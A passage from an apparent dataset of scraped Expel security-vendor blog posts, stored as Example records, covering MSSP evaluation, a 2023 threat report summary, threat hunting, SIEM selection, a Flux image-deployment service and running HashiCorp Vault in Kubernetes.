celebrating? What about the last spot award or kudos someone got? Can they remember when something like that happened? 8. In search of quality-seeking behaviors  ask about conflict Theres plenty of info out on the interwebs about the negative effects of groupthink and the need for constructive debate. Yet conflict seems to be a dirty word in most office environments. Instead of having a difficult conversation we hear lets take it offline which is office lingo for lets stop talking about this because its making me uncomfortable. Ask about disagreements, technical or otherwise, and how theyre resolved within the organization. Ask for an example. Youll quickly get a sense as to how the environment supports constructive disagreement and the extent to which office politics play a role. 9. In search of quality-seeking behaviors  ask about metrics You may only get operational insight into a subset of the metrics your service provider uses to measure the quality and efficacy of what they do every day. Have someone walk you through it. How does the org measure the effectiveness of detection logic? How do they measure the availability of technology, whether its their own or yours? Can someone provide an example of a metric he or she thought was useful  but turns out it wasnt? Is there a metric the org recently added because theyve learned something new? Look for this engine of continuous improvement within the things they count and measure. 10. In search of quality-seeking behaviors  ask about hiring When you were hired, someone entrusted you to make good hiring decisions. When you hired a manager, you entrusted her to do the same. Maybe you provided feedback, coaching or training to help her be more effective. As you bring on a service provider, you have the same need. Their hiring practices will directly impact the quality of the service you experience over time. How do they think about hiring? Talk to the head of HR. Do they use a structured hiring process? How do they think about evaluating experience, skills and traits? What key traits do they look for in hires throughout the organization? Any organization with rich answers around these questions (especially when these answers are consistent throughout the organization) clearly has a high hiring bar. 11. In search of self-assessment  ask about evaluations Do employees have the opportunity to think about how theyre doing and how theyre growing? And does anyone guide them through this process? The answer here cant be as simple as yeah, we do annual reviews  and theyre super stressful. A huge component of perpetually increasing quality is making sure that every employee has real, ongoing opportunities for learning and growth. As you meet security practitioners, engineers and managers, ask what theyve learned since they started. What technical and non-technical growth have they experienced and how has this helped them grow their careers? Who supported this growth and how much did the company do to help? Are there programs in place to encourage this development? The more a company does to invest in its employees, the more likely it is that those employees will be investing in improving the service you receive. 12. In search of self-assessment  look out for hubris We started this blog talking about some iconic names in technology like AOL and Apple. Do you remember when AOL bought Time Warner? Have you seen what happens to technology companies that become so full of themselves they feel like youre obligated to buy their stuff? That only lasts so long. This is a difficult area to assess but an important one. If everyone you talk to is convinced theyre the best at everything they do, thats a warning sign. If everyone is taking themselves a little too seriously, there might not be enough room for fallibility. If its our way or the highway and compromise is out of the question, then that provider probably isnt a good fit for you. These warning signs create blinders for an organization, making it difficult for them to see when theyve done something wrong and learn from that mistake. What if were wrong about all of this? Perhaps were wrong about what it takes to maintain a culture that generates quality over time. But we do know this for certain: When youre evaluating an MSSP, you should walk away feeling pretty confident that over the course of your working relationship youll both get better together. Or maybe youre sitting there wondering what our answers would be for some of these questions. Well, youre welcome to ask  or maybe in the not-too-distant future, well publish some of them right here.'}) (input_keys={'title'}),
  Example({'title': '2023 Great eXpeltations report: top six findings', 'url': 'https://expel.com/blog/2023-great-expeltations-report-top-six-findings/', 'date': 'Jan 31, 2023', 'contents': 'Subscribe  EXPEL BLOG 2023 Great eXpeltations report: top six findings Security operations  2 MIN READ  BEN BRIGIDA  JAN 31, 2023  TAGS: MDR Bad news: 2022 was a big year in cybersecurity. Good news: We stopped a lot of attacks. Better news: We sure learned a lot, didnt we? We just released our Great eXpeltations annual report, which details the major trends we saw in the security operations center (SOC) last yearand what you can do about them this year. You can grab your copy now , and heres a taste of what youll find. Top findings from the Great eXpeltations report 1: Business email compromise (BEC) accounted for half of all incidents, and remains the top threat facing our customers. This finding is consistent with what we saw in 2021. Key numbers: Of the BEC attempts we identified: more than 99% were in Microsoft 365 (M365previously known as Office 365, or O365) and fewer than 1% occurred in Google Workspace. Fifty-three percent of all organizations experienced at least one BEC attempt, and one organization was targeted 104 times throughout the year. 2: Threat actors started moving away from authenticating via legacy protocols to bypass multi-factor authentication (MFA) in M365. Instead, the bad guys have adopted frameworks such as Evilginx2, facilitating adversary-in-the-middle (AiTM) phishing attacks to steal login credentials and session cookies for initial access and MFA bypass. FIDO2 (Fast ID Online 2) and certificate-based authentication stop AiTM attacks. However, many organizations dont use FIDO factors for MFA. 3: Threat actors targeted Workday to perpetrate payroll fraud. In July, our SOC team began seeing BEC attempts, across multiple customer environments, seeking illicit access to human capital management systemsspecifically, Workday. The goal of these attacks? Payroll and direct deposit fraud. Once hackers access Workday, they modify a compromised users payroll settings to add their direct deposit information and redirecting the victims paycheck into the attackers account. (Which is just evil.) The lesson? Enforce MFA within Workday and implement approval workflows for changes to direct deposit information. 4: Eleven percent of incidents could have resulted in deployment of ransomware if we hadnt intervened. This represents a jump of seven percentage points over 2021. Microsoft has made it easier to block macros in files downloaded from the internet , so ransomware threat groups and their affiliates are abandoning use of visual basic for application (VBA) macros and Excel 4.0 macros to break into Windows-based environments. Instead, theyre now using disk image (ISO), short-cut (LNK), and HTML application (HTA) files. Here are some stats we find interesting: Hackers used zipped JavaScript files to gain initial access in 44% of all ransomware incidents. ISO files were used to gain initial access in 12% of all ransomware incidents. This attack vector didnt make our list in 2021. Nine percent of all ransomware incidents started with an infected USB drive. 5: Six percent of business application compromise (BAC) attempts used push notification fatigue to satisfy MFA. Push notification fatigue occurs when attackers send repeated push notifications until the targeted employee authorizes or accepts the request. This allows the attacker to satisfy MFA. (Hackers may or may not have learned this technique from their four year-olds at home.) 6: Credential harvesters represented 88% of malicious email submissions. Credential theft via phishing continues to grow with identity the main focus of todays attacks. The top subject lines in malicious emails that resulted in an employee click or compromise were, Incoming Voice Message, Checking in, and Voice Mail Call received for &lt;users email&gt;. Our data shows that actionable, time-sensitive, and financially driven social engineering themes are most successful. The full report tells you morelots more and provides insights and advice to help you defend against these threats. Give it a look and if you have questions drop us a line .'}) (input_keys={'title'}),
  Example({'title': "3 must-dos when you're starting a threat hunting program", 'url': 'https://expel.com/blog/3-must-dos-when-starting-threat-hunting-program/', 'date': 'Aug 13, 2019', 'contents': 'Subscribe  EXPEL BLOG 3 must-dos when youre starting a threat hunting program Security operations  4 MIN READ  KATE DREYER  AUG 13, 2019  TAGS: How to / Hunting / Planning / SOC / Threat hunting This is a recap of a talk two of our Expletives gave at Carbon Blacks CB Connect in San Diego. Let us know what Qs youve got about threat hunting  drop us a note or message us on Twitter to chat. So youve decided you want to build a threat hunting program, but where do you start? There are several paths you can follow in building a threat hunting program. And, depending on what your hunting goals are, there are lots of options for how to hunt and what tools to use. However, figuring out exactly what approach is going to achieve your outcomes is often challenging too, especially when there are loads of fancy new tools being marketed at you every day and security buzzwords flying at you left and right. Our goal is to help you filter out the shiny stuff and think about the brass tacks of your programand whats going to make it (and you) successful. What Is Threat Hunting? Threat hunting is the process of creating a hypothesis, gathering past data, applying filtering criteria that supports the hypothesis, and investigating the leads that you generate. Its an important proactive way to look for attackers. If youve got existing security tech, you can use that for threat hunting, or you can think about what tools youll need to meet the goals of a new threat hunting program. And dont forget that using tools you already have and combining that data with other informationlike open-source intelligenceis an option too. We recently put together a list of the pros and cons of using different security tech for threat hunting, which is a helpful read if youre wondering how to use the tech you already own to conduct a hunt, as well as finding new tech that can help you in generating hypotheses for successful threat hunting. Is Hunting Right For Your Org? There are plenty of reasons to start a threat hunting program. The biggest perk is that, when planned out and executed well, itll provide you with an extra layer of security. However, like any investment it takes time and resources. And so youll want to consider whether its right for you and the business youre protecting. Before building your own threat hunting program, consider the risks facing your organization versus your available resources. For example, if you operate in a high-risk or highly-targeted environmentmaybe you work at a financial institution, a health facility or another company that stores large amounts of sensitive information about customersthen hunting probably makes sense because there are plenty of adversaries wholl find your organization to be an attractive target. But if your organizations risk profile is medium- to low-risk, your time and budget might be better spent on less sophisticated threats like commodity malware. If you dont operate in a high-risk environment, hunting might distract you from things that should probably be higher on the priority list like implementing effective anti-phishing controls. 3 Tips As You Start Building Your Own Threat Hunting Program If youve determined that you do want to build a threat hunting program, there are a couple considerations to mull over before knocking on your CISOs office door to ask for more people and budget. Think through your objectives, how youll report on what you find and how youll eventually scale your hunting program. Here are our three must-dos before you start a threat hunting program and how you can determine what information and technology to include within yours. Must-do 1: Know Your Threat Hunting Objectives Before you start talking about what tech youll use for hunting or how many people youll need, figure out what youre trying to accomplish and why. With threat hunting, youre assuming that something has already failed and youve been compromised. So as youre defining your objectives, make sure to: Validate your existing controls: Your objective is to validate existing security controls. This means your hunting hypothesis should be focused on an attacker thats already bypassed one or more of your security controls to get into your network. Where are there known (or suspected) vulnerabilities, or what controls have failed in the past? Assess the quality of your alert management and triage capabilities: Threat hunting is a great way to perform Quality Assurance (QA) on your alert management and triage efforts. You probably want to have someone reviewing the hunt results who didnt spend a ton of time in the past month reviewing alerts. Youll want to run techniques where the hypothesis is looking for activity where you wouldve expected alerts to be generated. A good example here could be looking for suspicious powershell usage. Identify notable events in your environment: If youre hunting, the goal doesnt always have to be to identify threats. Notable events are events that your hunting techniques identified that were previously unknown. You might uncover policy violations like discovering unauthorized software, or you may find activities that software or employees performed that you (or your team or customer) didnt know about. Evolve your detection libraries: If you have hunting techniques in place, a long-term goal is to figure out ways to make them high enough fidelity without losing their value so that they can become detections. Similarly, if you have detections that are too prone to false positives, think about how you can build a hypothesis around them and turn them into hunting techniques. Must-do 2: Decide How and What Information to Report On After defining your objectives, think about how youll report on the findings from your hunts. Not only that, but also consider who youre going to brief on those insights. For example, what hunt technique are you using and why? What data did you review and what did you discover? Then talk about the outcome of your hunt, including what steps you should takeif anyto make your org more resilient in the future. Must-do 3: Consider Long-Term Scaling of the Program Conducting a first successful hunt is great, but how do you plan to make threat hunting part of your ongoing security practices going forward? Can you maintain an effective threat hunting program with the resources you have today or do you need new tech or more people? Think about what scale looks like based on your goals and the businesss needs. Be prepared to have a conversation about all of your ideas on future scaling of your threat hunting program with your CISO or team lead. Have More Questions About Threat Hunting? To learn how Expel can help with your threat hunting program, contact us .'}) (input_keys={'title'}),
  Example({'title': '3 steps to figuring out where a SIEM belongs in your ...', 'url': 'https://expel.com/blog/3-steps-to-figuring-out-where-siem-belongs-in-security-program/', 'date': 'Sep 22, 2020', 'contents': 'Subscribe  EXPEL BLOG 3 steps to figuring out where a SIEM belongs in your security program Tips  9 MIN READ  MATT PETERS, DAN WHALEN AND PETER SILBERMAN  SEP 22, 2020  TAGS: MDR / SIEM / Tech tools Spin up a conversation about someones security operations and chances are the conversation will quickly move to their security information and event management (SIEM) tool. A SIEM can play an important role in your security strategy. But figuring out where it belongs (and what type of SIEM is best for you) depends on a few things. So, where to begin? Weve pinpointed three steps that can help you figure out where a SIEM fits within your security program. This post walks you through each of these steps and we hope it will help you decide what makes the most sense for you, your team and your business. Step 1: Figure out where you are on your SIEM journey Working with different customers, weve seen most orgs fall into one of three different categories. Which one are you? Just getting started Maybe youre just starting to get serious about security or you reached an inflection point and are looking for a SIEM to take your security program to the next level. Youre optimistic about the prospects of a SIEM and how it can help address some of your pain points, whether thats addressing visibility gaps or keeping your auditors happy! As you explore all of the SIEM options out there, youre pretty quickly realizing there are a ton of opportunities (especially around automation) but its also hard to get a handle on what factors should influence your decision. You may also be wondering: if its so easy to automate why isnt everyone doing this successfully? Youre excited to bring in a SIEM and up level your team but youre also wondering what pitfalls you should avoid and how to steer clear of a path that will end up costing too much and bogging down your team with low value work. Doubling down Youve had a SIEM or two (or three) and know what it takes to keep it singing. Youve learned through trial and error what works, what doesnt and the level of investment (people and money) you need internally (or through third-party partners ) to accomplish your use cases. Youve also had time to really figure out what use cases matter to you. All of those flashy selling points you thought would be a great value add? Youve come to terms with the fact that many of them arent for you. You know what you want of your SIEM and are looking to get the most you can with your existing investment  this could mean dedicating internal resources to managing your SIEM or looking outward for help. Disillusioned skeptic You arent sold on the tale that a SIEM can solve all of your security woes and you arent afraid to talk about it. How did you get here? It may have had something to do with your past experiences  youve tried to make a SIEM work in the past and have gotten burned . Maybe the product (or products) didnt do what you wanted, or it ended up costing way more than you could justify. Regardless, you now view your security program more holistically and dont see a SIEM as the single source of truth. Sure, there are use cases where it makes sense (you may still have a SIEM kicking around in a corner for your application and OS logs) but youre reluctant to hinge the success of your security program on a single solution. You prefer to rely on your various security products and services to get you the visibility and response capabilities you need to be successful. Now that youve figured out where you are in the SIEM journey, its time to move on to the next step! Step 2: Determine what use cases are most important to you No matter where you are in your journey, its important to clarify (and often re-clarify) what you re expecting your SIEM to do. You can make a SIEM do just about anything with enough effort (and consultants and money) and thats exactly what many organizations have done. Dont know where to begin? Consider the following use cases and who (you or a third-party) you envision taking responsibility: Use Case Description Examples Compliance and reporting Do you have regulatory requirements for retaining certain types of data? A SIEM could help you aggregate all of this required data and make it easy to satisfy audit requirements. ISO 27001 certification Threat Detection Depending on the maturity of your security program, you may have the need/desire to write your own detection rules. A SIEM can provide these capabilities, but also requires a definite investment in content management. Consider if you want to invest in internal teams to write and maintain detection rules or whether you want to leverage security products or services to accomplish this use case. You want to invest in a team to build custom detections for your unique application data You want alerts, but dont want to be responsible for content. (This is when you may want to look to products or services like Expel !) Investigative support A SIEM can be a powerful investigative tool if its fed with the right data and given the love and attention it needs. Using a SIEM for investigation is a very common use case, whether youre investing in an internal team or partnering with a third party to respond to your alerts. For this use case, consider how easy it is to add new log sources and how intuitive/fast searching that data is. An easy and fast search capability will empower your analysts to get to the bottom of an alert without unnecessary frustration. Building an internal security team that investigates with your SIEM Partnering with a third party like Expel to investigate with your SIEM Response Automation Containing and remediating an incident can be challenging, especially in large enterprise environments. If this is a challenge for your organization, consider how you can apply technology to this problem. Some SIEM technologies have built in response capabilities or SOAR integrations that can help in this area. As you explore these options, pay close attention to the level of effort required to configure these tools and make sure your investment will actually help solve your problem. Also consider who you want to be responsible for managing the tool (you vs third party). Splunk with Phantom integration A SOAR tool like Demisto Case Management Who did what and when? As your security program matures, process becomes more important. Once you have multiple analysts responsible for responding to alerts, knowing whos got it and how issues were resolved helps you understand whats happening across the environment. You can communicate that upwards to drive change. As you think about this use case, youll need to decide where you want incident management to occur  is it in your SIEM, a ticketing system or is a partner/third-party service responsible for managing alerts? Splunk with Enterprise Security serving as an incident management tool A ticketing system like Jira or Service Now Step 3: Know what type of SIEM you have (or want) Finally, whether you have a SIEM or are going shopping for one, its important to first understand use cases. Once you identify your needs, you can figure out which SIEMs are best for you. Traditional SIEM Traditional SIEMs are typically large, multifunction applications. They tend to have highly structured data models (think SQL vs full text indexing) which enable certain types of use cases but make others more difficult. If given proper care, they can be very powerful but often arent very flexible to changing requirements over time. Sample Vendors: QRadar, Arcsight, LogRhythm What are they good at? Highly oppinated data models make querying data and writing detections easy (once you understand the data model) One right way to do things keeps things relatively simple (accessibility is often better) Often come with a lot of out of the box features for detection, compliance and reporting Strong incident management feature sets, are a good candidate for single source of truth Products have been around for a long time and are generally mature and stable What are some common pain points? Hampered solutions (limited by opinionated data models/vendors way of doing things) For on-prem installations, management can be a significant investment, so you need to plan for that Slower to accommodate new use cases/features and can become behind the times Search-based SIEM Search-based SIEMs are essentially a log aggregation and search tool first with other features added on top of that core function. They have flexible data models and everything is driven by a search from rules to reporting and dashboards. But they often require a lot of expertise to satisfy certain use cases (like detection)  meaning youve got to live and breathe their search language to see value. Sample Vendors: Splunk ES, Sumo Logic, Exabeam What are they good at? Strong investigative support due to powerful search capabilities Flexible and accommodating for new use cases Often easier to manage (particularly for cloud-based/SaaS products) What are some common pain points? Incident management feature sets often lag behind traditional SIEMs as they have a less structured data model Requires expertise to accomplish your use cases (you need to be an expert in their search language) DIY SIEM TL;DR  youre starting from scratch. DIY SIEM options are usually open source projects organizations invest in and build additional tooling around. These options offer a lot of flexibility and can be much more cost effective, however they require a significant investment in engineering and in-house security expertise to build out security use cases. Sample Vendors: Elastic stack, OSSIM What are they good at? Potential long-term cost savings (if you have significant in-house expertise to build and manage!) Flexibility: You have complete control over the solution and can build out the use cases you need What are some common pain points? Organizations often realize theyve bitten off more than they can chew in terms of engineering and security expertise required to build and manage a DIY SIEM On-going operational cost of maintenance is on your internal team instead of a third party, which potentially distracts you from the things that are important to your business Open source options are often significantly limited in feature sets and deployment size May not be compatible with security services (if you ever choose to partner) No SIEM Some organizations forgo a SIEM altogether. This may be an option in cases where your use cases can be satisfied with other existing tools or partnerships with third party services. For example, if you have no regulatory requirements and have limited log sources (perhaps a few SaaS applications) there may be no good reason to invest heavily in a SIEM if a third party like Expel can address your use cases directly! Sample Vendors: Expel and other similar MSSP/MDRs/XDRs What are the advantages of forgoing SIEM? One less security tool you have to pay for Reduced complexity and less responsibility What are some reasons you might need a SIEM? Regulatory requirements You have use cases your existing products and services cant accomplish (like writing rules against your custom application logs or helping your internal teams investigate issues) Whats your next step? Theres a lot to consider as you think (or re-think) how a SIEM should fit into your security program. By identifying where youre in your SIEM journey (and where you want to go), prioritizing use cases and choosing the right SIEM product, you can set your team up for long term success. Theres likely no one-size-fits-all solution, but here are some common models weve seen: SIEM model cheat sheet ( steal me! ) Decentralized model Some organizations do not have a significant need or desire to invest in a SIEM. These organizations may still have a SIEM off in a corner somewhere for a very specific purpose, but it is not central to their security program. Instead, security signal is often consumed directly from security products or from a third-party monitoring service like Expel. Hybrid model A SIEM can help layer additional capabilities on top of existing security controls. A hybrid approach (where a SIEM is used in combination with other security tools) can help deliver capabilities that are best of both worlds.As an example, many organizations choose to use their SIEM for investigation and compliance, but rely on their security products for detections and a ticketing system for incident management. A service like Expel in this model can help by integrating with all of the various sources of signal directly while leveraging the capabilities of the SIEM to provide visibility across the environment. Centralized model (single pane of glass) In this model, the SIEM is the center of the organizations security program. The organization is investing significantly in their SIEM and wants it to be the place where everything happens  from alerting to response and incident management. This model requires expertise, either internal or third party (like a co-managed SIEM service) to succeed. It also requires that all security signals be routed through the SIEM for detection and response. This is an expensive but effective approach for large security teams that have the resources to go this route. Organizations considering this approach should consider their use cases carefully and ensure the long-term investment is worth it! In many cases, the same use cases can be accomplished with a hybrid approach at a lower cost. Parting thoughts Weve seen all of these models work. Your decision depends on what makes sense for your business. The key to success is understanding what is important to you and what options you have in front of you. Weve gone through this very process at Expel and hope this framework can work for you too! Want to talk to someone before making a decision about your information security? Lets chat .'}) (input_keys={'title'}),
  Example({'title': '45 minutes to one minute: how we shrunk image deployment ...', 'url': 'https://expel.com/blog/how-we-shrunk-image-deployment-time/', 'date': 'Dec 13, 2022', 'contents': 'Subscribe  EXPEL BLOG 45 minutes to one minute: how we shrunk image deployment time Engineering  5 MIN READ  BJORN STANGE  DEC 13, 2022  TAGS: Tech tools We use a GitOps workflow. In practice, this means that all of our infrastructure is defined in YAML (either plain or templated YAML using jsonnet) and continuously applied to our Kubernetes (k8s) cluster using Flux. Initially, we set up Flux v1 for image auto updates. This meant that in addition to applying all the k8s manifests from our Git repo to the cluster, Flux also watched our container registry for new tags on certain images and updated the YAML directly in that repo. This seems great on paper, but in practice it ended up not scaling very well. One of my first projects when I joined Expel was to improve the teams visibility into the health of Flux. It was one of the main reasons that other teams came to the #ask-core-platform Slack channel for help. Here are a few such messages: Is Flux having issues right now? I made an env var change to both staging and prod an hour ago and Im not seeing it appear in the pods, even after restarting them Could someone help me debug why my auto deploys have stopped? Hi team, Flux isnt deploying the latest image in staging Hi! Is Flux stuck again? Waiting 30m+ on a deploy to staging Deployment smoketest We decided to build a deployment smoketest after realizing that Flux wasnt providing enough information about its failure states. This allowed us to measure the time between when an image was built and when it went live in the cluster. We were shocked to find that it took Flux anywhere between 20 to 45 minutes to find new tags that had been pushed to our registry and update the corresponding YAML file. (To be clear, Flux v1 is no longer maintained and has been replaced with Flux v2.) These scalability issues were even documented by the Flux v1 team. (Those docs have since been taken down, otherwise I would link them.) I believe it was because we had so many tags in Google Container Registry (GCR), but the lack of visibility into the inner workings of the Flux image update process meant that we couldnt reach any definitive conclusions. We were growing rapidly, teams were shipping code aggressively, and more and more tags were added to GCR every day. Were at a modest size (~350 images and ~40,000 tags). I did some pruning of tags older than one year to help mitigate the issue, but that was only a temporary fix to hold us over until we had a better long-term solution. The other failure state we noticed is that sometimes invalid manifests found their way into our repo. This would result in Flux not being able to apply changes to the cluster, even after the image had been updated in the YAML. This scenario was usually pretty easy to diagnose and fix since the logs made it clear what was failing to apply. Flux also exposes prometheus metrics that expose how many manifests were successfully and unsuccessfully applied to the cluster, so creating an alert for this is straightforward. Neither the Flux logs nor the metrics had anything to say about the long registry scan times, though. Image updater We decided to address the slow image auto-update behavior by writing our own internal service. Initially, I thought we should just include some bash scripts in CircleCI to perform the update (we got a proof-of-concept working in a day) but decided against it as a team since it wouldnt provide the metrics/observability we wanted. We evaluated ArgoCD and Flux v2, but decided that it would be better to just write something in-house that did exactly what we wanted. We had hacked together a solution to get Flux v1 to work with our jsonnet manifests and workflow, but it wasnt so easy to do with the image-update systems that came with ArgoCD and Flux v2. Also, we wanted more visibility/metrics around the image update process. Design and architecture This relatively simple service does text search + replace in our YAML/jsonnet files, then pushes a commit to the main branch. We decided to accomplish this using a keyword comment so wed be able to find the files, and the lines within those files, to update. Heres what that looks like in practice for yaml and jsonnet files. image: gcr.io/demo-gcr/demo-app:0.0.1 # expel-image-automation-prod local staging_image = gcr.io/demo-gcr/demo-app:staging-98470dcc; // expel-image-automation-staging local prod_image = gcr.io/demo-gcr/demo-app:0.0.1; // expel-image-automation-prod We also decided to use an event-based system, instead of one that continuously polls GCR. The new system would have to be sent a request by CircleCI to trigger an image update. The new application would have two components, each with its own responsibilities. We decided to write this in Go, since everyone on the team was comfortable maintaining an internal Go service (we already maintain a few). Server The server would be responsible for receiving requests over HTTP and updating a database with the desired tag of an image, and which repo and branch were working with. The requests and responses are JSON, for simplicity. We use Kong to provide authentication to the API. Syncer The syncer is responsible for implementing most of the logic of an image update. It first finds all out of sync images in the database, then it clones all repos/branches it needs to work with, then does all the text search/replace using regex, and then pushes a commit with the changes to GitHub. We decided to use ripgrep to find all the files because it would be much faster than anything we would implement ourselves. We try to batch all image updates into a single commit, if possible. The less often we have to perform a git pull, git commit, and git push, the faster well be. The syncer will find all out of date images and update them in a single commit. If this fails for some reason, then we fall back to trying to update one image at a time and creating a commit + pushing + pulling for each image. This is how image-updater fits into our GitOps workflow today. Improvements Performance Performance is obviously the main benefit here. The image update operation takes, on average, two to four seconds. From clicking release on GitHub to traffic being served by the new replica set usually takes around seven minutes (including running tests/building the docker image, and waiting for the two- minute Flux cluster sync loop). The image-update portion of that takes only one sync loop, which runs every minute. Hence, 45 minutes to one . Were still migrating folks off of Flux and onto image-updater, but as far as we can tell, things are humming away smoothly and the developers can happily ship their code to staging and production without having to worry about whether Flux will find their new image. Observability The nice thing about writing your own software is that you can implement logging and metrics exactly how youd like. We now have more visibility into our image update pipeline than ever. We implemented tracing to give us more granular visibility into how long it takes our sync jobs to run. This allows us to identify bottlenecks in the future if we ever need to, as we can see exactly how long each operation takes (git pull, git commit, find files to update, perform the update, git push, etc). As expected, the git pull and push operations are the most expensive. We also have more visibility into which images are getting pushed through our system. We implemented structured logging that follows the same pattern as the rest of the Go applications at Expel. We now know exactly if/when images fail to get updated and why, via metrics and logs. jsonnet This system natively supports jsonnet, our preferred method of templating our k8s YAML. Flux v1 did not natively support jsonnet. We even made a few performance improvements to the process that renders our YAML along the way. Plans for the future Flux v1 is EOL so were planning on moving to ArgoCD to perform the cluster sync operation from GitHub. We prototyped ArgoCD already and really like it. Weve got a bunch of ideas for the next version of image updater, including a CLI, opening a pull request with the change instead of just committing directly to main, and integrating with Argo Rollouts to automatically roll back a release if smoketests fail.'}) (input_keys={'title'}),
  Example({'title': '5 best practices to get to production readiness with ...', 'url': 'https://expel.com/blog/production-readiness-hashicorp-vault-kubernetes/', 'date': 'Mar 9, 2021', 'contents': 'Subscribe  EXPEL BLOG 5 best practices to get to production readiness with Hashicorp Vault in Kubernetes Engineering  6 MIN READ  DAVID MONTOYA  MAR 9, 2021  TAGS: Cloud security / MDR / Tech tools At Expel, weve been long-time users of Hashicorp Vault. As our business and engineering organization has grown, so has our core engineering platforms reliance on Hashicorp Vault to secure sensitive data and the need to have a highly-available Vault that guarantees the continuity of our 247 managed detection and response (MDR) service. We also found that as our feature teams advanced on their Kubernetes adoption journey, we needed to introduce more Kubernetes idiomatic secret-management workflows that would enable teams to self-service their secret needs for containerized apps. Which meant that we needed to increase our Vault infrastructures resilience and deployment efficiency, and unlock opportunities for new secret-access and encryption workflows. So, we set out to migrate our statically-provisioned VM-based Vault to Google Kubernetes Engine (GKE). We knew the key to success is following best security practices in order to incorporate Hashicorp Vault into our trusted compute base. There are a variety of documented practices online for running Vault in Kubernetes. But some of them arent up-to-date with Kubernetes specific features added on newer versions of Vault, or fail to describe the path to take Vault securely to production-readiness. Lets connect Thats why I created a list of architectural and technical recommendations for Expels site reliability engineering (SRE) team. And Id like to share these recommendations with you. (Hi, Im David and Im a senior SRE here at Expel.) After reading this post, youll be armed with some best practices thatll help you to reliably and securely deploy, run and configure a Vault server in Kubernetes. What is Hashicorp Vault? Before we dive into best practices, lets cover the basics. Hashicorp Vault is a security tool rich in features to enable security-centric workflows for applications. It allows for secret management for both humans and applications, authentication federation with third-party APIs (e.g.: Kubernetes), generation of dynamic credentials to access infrastructure (e.g.: a PostgreSQL database), secure introduction (for zero trust infrastructure) and encryption-as-a-service. All of these are guided by the security tenet that all access to privileged resources should be short-lived. As you read this post, its also important to keep in mind that a Kubernetes cluster is a highly dynamic environment. Application pods are often shuffled around based on system load, workload priority and resource availability. This elasticity should be taken into account when deploying Vault to Kubernetes in order to maximize the availability of the Vault service and reduce the chances of disruption during Kubernetes rebalancing operations. Now on to the best practices. Initialize and bootstrap a Vault server To get a Vault server operational and ready for configuration, it must first be initialized, unsealed and bootstrapped with enough access policies for admins to start managing the vault. When initializing a Vault server, two critical secrets are produced: the unseal keys and the root token. These two secrets must be securely kept somewhere else  by the person or process that performs the vault initialization. A recommended pattern for performing this initialization process and any subsequent configuration steps is to use an application sidecar. Using a sidecar to initialize the vault, we secured the unseal keys and root token in the Google Secret Manager as soon as they were produced, without requiring human interaction. This prevents the secrets from being printed to standard output. The bootstrapping sidecar application can be as simple as a Bash script or a more elaborate program depending on the degree of automation desired. In our case, we wanted the bootstrapping sidecar to not only initialize the vault, but to also configure access policies for the provisioner and admin personas, as well as issue a token with the provisioner policy and secure it in the Google Secret Manager. Later, we used this provisioner token in our CI workflow in order to manage Vaults authentication and secret backends using Terraform and Atlantis . We chose Go for implementing our sidecar because it has idiomatic libraries to interface with Google Cloud Platform (GCP) APIs and reusing the Vault client library already included in Vault is easy  which is also written in Go. Pro tip: Vault policies govern the level of access for authenticated clients. A common scenario, documented in Vaults policy guide , is to model the initial set of policies after an admin persona and a provisioner persona. The admin persona represents the team that operates the vault for other teams or an org, and the provisioner persona represents an automated process that configures the vault for tenants access. Considering the workload rebalancing that often happens in a Kubernetes cluster, we can expect the sidecar and vault server containers to suddenly restart. Which is why its important to ensure the sidecar can be gracefully stopped and can accurately determine the health of the server before proceeding with any configuration and further producing log entries for the admins with an initial diagnosis on the status of the vault. By automating this process, we also made it easier to consistently deploy vaults in multiple environments, or to easily create a new vault and migrate snapshotted data in a disaster recovery scenario. Run Vault in isolation We deploy Vault in a cluster dedicated for services offered by our core engineering platform, and fully isolated from all tenant workloads. Why? We use separation of concerns as a guiding principle in order to guarantee the principle of least privilege when granting access to infrastructure. We recommend running the Vault pods on a dedicated nodepool to have finer control over their upgrade cycle and enabling additional security controls on the nodes. When implementing high availability for applications, as a common practice in Kubernetes, pod anti-affinity rules should be used to ensure no more than one Vault pod is allocated to the same node. This will isolate each vault server from zonal failures and node rebalancing activities. Implement end-to-end encryption This is an obvious de-facto recommendation when using Vault . Even for non-production vaults you should use end-to-end TLS. When exposing a vault server through a load balanced address using a Kubernetes Ingress, make sure the underlying Ingress controller supports TLS passthrough traffic to terminate TLS encryption at the pods, and not anywhere in between. Enabling TLS passthrough is the equivalent of performing transmission control protocol (TCP) load balancing to the Vault pods. Also, enable forced redirection from HTTP to HTTPS. When using kubernetes/ingress-nginx as the Ingress controller, you can configure TLS passthrough with the Ingress annotation nginx.ingress.kubernetes.io/ssl-passthrough. Configuration for the Ingress resource should look as follows: Ensure traffic is routed to the active server In its simplest deployment architecture, Vault runs with an active server and a couple hot-standbys that are often checking the storage backend for changes on the writing lock. A common challenge when dealing with active-standby deployments in Kubernetes is ensuring that traffic is only routed to the active pod. A couple common approaches are to either use readiness probes to determine the active pod or to use an Ingress controller that supports upstream health checking. Both approaches come with their own trade-offs. Luckily, after Vault 1.4.0 , we can use the service_registration stanza to allow Vault to register within Kubernetes and update the pods labels with the active status. This ensures traffic to the vaults Kubernetes service is only routed to the active pod. Make sure you create a Kubernetes RoleBinding for the Vault service account that binds to a Role with permissions to get , update and patch pods in the vault namespace. The vaults namespace and pod name must be specified using the Downward API as seen below. Enable service registration in the vault .hcl configuration file like this: Set VAULT_K8S_POD_NAME and VAULT_K8S_NAMESPACE with the current namespace and pod name: With the configuration above, the Kubernetes service should look like this: Configure and manage Vault for tenants with Terraform Deploying, initializing, bootstrapping and routing traffic to the active server are only the first steps toward operationalizing a vault in production. Once a Hashicorp Vault server is ready to accept traffic and there is a token with provisioner permissions, youre ready to start configuring the vault authentication methods and secrets engines for tenant applications. Depending on the environment needs, this type of configuration can be done using the Terraform provider for Vault or using a Kubernetes Operator. Using an operator allows you to use YAML manifests to configure Vault and keep their state in sync thanks to the operators reconciliation loop. Using an operator, however, comes at the cost of complexity. This can be hard to justify when the intention is to only use the operator to handle configuration management . Thats why we opted for using the Terraform provider to manage our vault configuration. Using Terraform also gives us a place to centralize and manage other supporting configurations for the authentication methods. A couple examples of this is configuring the Kubernetes service account required to enable authentication delegation to a clusters API server or enabling authentication for the vault admins using their GCP service account credentials. When using the Kubernetes authentication backend for applications running in a Kubernetes cluster, each application can authenticate to Vault by providing a Kubernetes service account token (a JWT token) that the Vault server uses to validate the caller identity. It does this by invoking the Kubernetes TokenReview API on the target API server configured via the Terraform resource vault_kubernetes_auth_backend_config . Allow Vault to delegate authentication to the tenants Kubernetes cluster: Once youve configured Vault to allow for 